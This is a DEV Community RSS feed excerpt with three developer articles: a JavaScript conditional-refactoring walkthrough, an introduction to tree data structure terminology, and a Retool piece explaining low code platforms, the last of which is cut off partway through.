<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Refactor Conditionals (+900% less code to read?)</title>
      <author>Clean Code Studio</author>
      <pubDate>Fri, 25 Jun 2021 22:57:03 +0000</pubDate>
      <link>https://dev.to/cleancodestudio/refactor-conditionals-900-more-readable-24np</link>
      <guid>https://dev.to/cleancodestudio/refactor-conditionals-900-more-readable-24np</guid>
      <description>&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
   &lt;span class="na"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="na"&gt;exists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
      &lt;span class="na"&gt;number&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1 (555) 555-5555&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; 
   &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Question:&lt;/strong&gt; &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;We have a 9 line function that goes three indentations deep.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;We can simplify this function. The question is, how much more readable are we able to make this function?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Through six simple iterations of refactoring this function we are going to simplify this hasUSNumber function into a single line with zero indents.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;




&lt;p&gt;&lt;strong&gt;1: Traditional if-else statement (with nested if)&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;    
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;2: Inverse if-else condition to remove nested if&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;
   &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;3: Combine original if and nested-if statements and return early to remove else-if statement all together&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; 
   &lt;span class="p"&gt;}&lt;/span&gt;

   &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;4: Directly return condition itself and remove if statement as well as one of the return statements.&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;5: Use implicit(arrow) js function, removes "return" key word and function curly brackets&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;6: de-structure function parameter to grab the phone property allowing us to remove the need to shorten our line by removing "dude." twice within our statement"&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;phone&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;p&gt;&lt;strong&gt;Batta bing bodda boom, just like that we've made more room in our heads and in our applications.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Starting function&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dude&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dude&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;    
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Ending function&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;hasUSNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exists&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;phone&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;number&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;startsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;+1&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We simplified &lt;strong&gt;9 lines&lt;/strong&gt; down to &lt;strong&gt;1 line&lt;/strong&gt;, &lt;strong&gt;3 indents&lt;/strong&gt; down to &lt;strong&gt;0 indents&lt;/strong&gt;, and &lt;strong&gt;181 characters&lt;/strong&gt; down to &lt;strong&gt;74 characters&lt;/strong&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;
The crazy part is that refactor opportunities to simplify if statements like this happen ALL OF THE TIME in reactjs, vuejs, angular, and just about any front-end project!

Keep your eyes peeled and you'll be saving your project, team, that brain of yours *thousands* of lines of code!


**Overview of the refactoring tricks We Used**
- Inverse conditional check 
   Refactor 
     `if ($x === true)` 
   To 
     `if ($x === false)`

- Combine nested if's into one statement using &amp;amp;&amp;amp; operator
  Refactor 
     `if ($x === true)`
        `if ($y === true)`
  To
    `if ($x === false &amp;amp;&amp;amp; $y === false)` 

 - Return condition itself directly instead of true if that condition is true

  Refactor
    ```

js
      if ($x === true) {
        return true
      } else {
        return false
      }


&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To&lt;br&gt;
    &lt;code&gt;return $x&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Imagine doing this kind of refactor 50 times throughout a project. You'll have a huge impact!&lt;/p&gt;

&lt;p&gt;Clean Code Studio&lt;br&gt;
&lt;a href="https://cleancode.studio"&gt;https://cleancode.studio&lt;/a&gt;&lt;br&gt;
Clean Code Clean Life ~ Simplify!&lt;br&gt;
&lt;a href="https://youtube.com/c/cleancodestudio"&gt;https://youtube.com/c/cleancodestudio&lt;/a&gt;&lt;/p&gt;

</description>
      <category>cleancode</category>
      <category>simplify</category>
      <category>returnearly</category>
      <category>boolean</category>
    </item>
    <item>
      <title>part_1: Introduction to tree data structure </title>
      <author>Aya Bouchiha</author>
      <pubDate>Fri, 25 Jun 2021 22:53:29 +0000</pubDate>
      <link>https://dev.to/ayabouchiha/part1-introduction-to-tree-data-structure-277b</link>
      <guid>https://dev.to/ayabouchiha/part1-introduction-to-tree-data-structure-277b</guid>
      <description>&lt;p&gt;Hi, on this amazing day! we're going to talk about tree data structure, so let's get started!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#definition-of-tree"&gt;
  &lt;/a&gt;
  Definition of tree
&lt;/h2&gt;

&lt;p&gt;A tree is a nonlinear data structure unlike Stack, Queue, Array, and Linked List, It is a collection of nodes connected with &lt;strong&gt;edges&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#properties-of-tree"&gt;
  &lt;/a&gt;
  Properties of tree
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Root: &lt;em&gt;parent node&lt;/em&gt; is the first (top) node of the tree.&lt;/li&gt;
&lt;li&gt;Parent: node has children&lt;/li&gt;
&lt;li&gt;Child: node has a parent &lt;/li&gt;
&lt;li&gt;Siblings: nodes have the same parent&lt;/li&gt;
&lt;li&gt;Leaves: last nodes of the tree&lt;/li&gt;
&lt;li&gt;Depth: length of edges from a node to the root&lt;/li&gt;
&lt;li&gt;Height: length of the longest path from a node to a leaf&lt;/li&gt;
&lt;li&gt;Edge: link two nodes&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--t7kfX8_6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3g9ko0vqoh9vryh2jbpv.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--t7kfX8_6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3g9ko0vqoh9vryh2jbpv.jpg" alt="tree data structure Aya Bouchiha"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#references-and-useful-resources"&gt;
  &lt;/a&gt;
  References and useful resources
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.freecodecamp.org/news/all-you-need-to-know-about-tree-data-structures-bceacb85490c/"&gt;https://www.freecodecamp.org/news/all-you-need-to-know-about-tree-data-structures-bceacb85490c/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.google.com/url?sa=t&amp;amp;source=web&amp;amp;rct=j&amp;amp;url=https://www.programiz.com/dsa/trees&amp;amp;ved=2ahUKEwiVy4TcsrPxAhXC8-AKHb_tDHYQFjAnegQIRxAC&amp;amp;usg=AOvVaw1zWsV1g-7GgAmP97ri-G9n"&gt;https://www.google.com/url?sa=t&amp;amp;source=web&amp;amp;rct=j&amp;amp;url=https://www.programiz.com/dsa/trees&amp;amp;ved=2ahUKEwiVy4TcsrPxAhXC8-AKHb_tDHYQFjAnegQIRxAC&amp;amp;usg=AOvVaw1zWsV1g-7GgAmP97ri-G9n&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.google.com/url?sa=t&amp;amp;source=web&amp;amp;rct=j&amp;amp;url=https://www.geeksforgeeks.org/binary-tree-data-structure/&amp;amp;ved=2ahUKEwiVy4TcsrPxAhXC8-AKHb_tDHYQFjAmegQIShAC&amp;amp;usg=AOvVaw3GgvSIZH7aOmawSCQQvYSh"&gt;https://www.google.com/url?sa=t&amp;amp;source=web&amp;amp;rct=j&amp;amp;url=https://www.geeksforgeeks.org/binary-tree-data-structure/&amp;amp;ved=2ahUKEwiVy4TcsrPxAhXC8-AKHb_tDHYQFjAmegQIShAC&amp;amp;usg=AOvVaw3GgvSIZH7aOmawSCQQvYSh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://youtu.be/qH6yxkw0u78"&gt;https://youtu.be/qH6yxkw0u78&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>algorithms</category>
      <category>computerscience</category>
      <category>beginners</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>What is low code?</title>
      <author>kevbosaurus</author>
      <pubDate>Fri, 25 Jun 2021 22:51:54 +0000</pubDate>
      <link>https://dev.to/retool/what-is-low-code-4egk</link>
      <guid>https://dev.to/retool/what-is-low-code-4egk</guid>
      <description>&lt;p&gt;Low code and no code have all the hype, but among developers, they also have equal amounts of skepticism.&lt;/p&gt;

&lt;p&gt;In March 2021, no code pioneer Zapier &lt;a href="https://techcrunch.com/2021/03/08/zapier-buys-no-code-focused-makerpad-in-its-first-acquisition/"&gt;acquired no-code community Makerpad&lt;/a&gt;. In April 2021, UiPath, a provider of low code automation software, &lt;a href="https://fortune.com/2021/04/21/uipath-ipo-valuation-stock-price/"&gt;IPO'd at $31 billion&lt;/a&gt;. Gartner predicts that by 2024, &lt;a href="https://www.forbes.com/sites/ilkerkoksal/2020/04/29/the-rise-of-low-code-app-development/"&gt;more than 65%&lt;/a&gt; of application development activity will come from low code application development platforms.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.wsj.com/articles/SB10001424053111903480904576512250915629460"&gt;Software is eating the world&lt;/a&gt;, but low code and no code are making developers rethink how software is made.&lt;/p&gt;

&lt;p&gt;Of course, (some) developers tell a different story. According to an &lt;a href="https://evansdata.com/press/viewRelease.php?pressID=272"&gt;Evans Data report&lt;/a&gt;, one in five developers never use low code, and almost three-quarters of developers use low code less than half the time. And anecdotally, many developers express a similar sentiment to low code as &lt;a href="https://www.reddit.com/r/learnprogramming/comments/ba82qm/should_you_learn_how_to_use_lowcode_platforms/"&gt;Reddit user blahblahblah&lt;/a&gt; does below:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gnc0YELQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://lh5.googleusercontent.com/9tY8fQgqAEbv-snvuFQZBR0kFjvh51e2KcDKhmFokrZnB6vGvGAw4dNV30A5U_3MES4RWjvi_A1i_rJE0uNYupL7wvBZduo0qTJrt2QN22WEGmaczF_v9jXlc1l5LWt9P2nPjDzW" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gnc0YELQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://lh5.googleusercontent.com/9tY8fQgqAEbv-snvuFQZBR0kFjvh51e2KcDKhmFokrZnB6vGvGAw4dNV30A5U_3MES4RWjvi_A1i_rJE0uNYupL7wvBZduo0qTJrt2QN22WEGmaczF_v9jXlc1l5LWt9P2nPjDzW" alt="reddit low-code"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this article, we're going to dig into open questions, including:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  What is low code?&lt;/li&gt;
&lt;li&gt;  What's the difference between low code and no code?&lt;/li&gt;
&lt;li&gt;  What are the major use cases for low code?&lt;/li&gt;
&lt;li&gt;  What are the benefits and drawbacks of low code?&lt;/li&gt;
&lt;li&gt;  What does low code say about the future of software development?&lt;/li&gt;
&lt;li&gt;  What are some good low code development platforms?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Throughout, we'll return to the thesis that though low code may not be &lt;em&gt;disrupting&lt;/em&gt; or &lt;em&gt;replacing&lt;/em&gt; software development, it is &lt;em&gt;transforming&lt;/em&gt; it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-low-code-a-primer"&gt;
  &lt;/a&gt;
  What is low code? A primer
&lt;/h2&gt;

&lt;p&gt;Low code is the development of software via a visual, drag-and-drop interface. The logic is simple and the UI is intuitive, but the results are scalable, secure, and performant.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-three-components-of-low-code"&gt;
  &lt;/a&gt;
  The three components of low code
&lt;/h3&gt;

&lt;p&gt;A low code development platform consists of three major components that are, by and large, common across all low code tools and platforms.&lt;/p&gt;

&lt;p&gt;A visual integrated development environment (IDE): This is the core of a low code development platform. It's usually a drag-and-drop interface that developers use to model workflows and declare logic. As necessary, developers can also use it to add hand-written code. Typically, developers use the IDE to create most of the app and then customize the last mile with hand-written code.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--91JbipR3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://retool.com/blog/content/images/2021/06/Low-code.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--91JbipR3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://retool.com/blog/content/images/2021/06/Low-code.gif" alt="low-code Retool"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Connectors: Depending on the low code platform, various kinds of connectors plug the platform into a variety of back-end services, databases, and APIs. These provide extensibility and increased functionality. Developers tend to prioritize connectors because the usefulness of a low code platform is directly tied to what it integrates with. Some early low code platforms are short on connection functionality, leaving developers with with unnecessary workarounds or missed requirements.&lt;/p&gt;

&lt;p&gt;Application lifecycle manager: Again, depending on the low code platform, it might also include tools for debugging, deployment, and maintenance across testing, staging, and production. If a low code platform promises robust results that match those produced by hand-coding, then it needs to come with lifecycle management to match the standard software development lifecycle that developers run when creating software from scratch.&lt;/p&gt;

&lt;p&gt;Though low code platforms and tools can differ widely, they all tend to share these three components.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#what-does-low-code-do"&gt;
  &lt;/a&gt;
  What does low code do?
&lt;/h3&gt;

&lt;p&gt;The primary goal of low code is to reduce the amount of "hand-coding" (i.e., code done from scratch) and increase the amount of code reused and apps developed. Low code is highly composable, meaning that when you use the visual IDE to construct a component, it's easy to then reuse that component in different situations. You get the initial speed of using an IDE and then even more speed as you reuse the resulting components.&lt;/p&gt;

&lt;p&gt;The reason why it's called "low code" (as opposed to "no code," which we'll get into in the next section) is that low code development is split roughly 80:20 visual coding to hand-coding. You build about 80% of your app using a low code UI and then hand-code the rest---usually last-mile specifications, as necessary. In the below video, for instance, our developer advocate, Chris Smith, uses in-line JavaScript to get an order total for a MongoDB admin panel.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#the-future-of-low-code-is-bright"&gt;
  &lt;/a&gt;
  The future of low code is bright
&lt;/h3&gt;

&lt;p&gt;Developers have plenty of reasons to be skeptical of low code. Many have seen the rise of technology fads that similarly promised the reduction---or even the elimination---of traditional programming. The elders among us will remember Visual Basic and PowerBuilder.&lt;/p&gt;

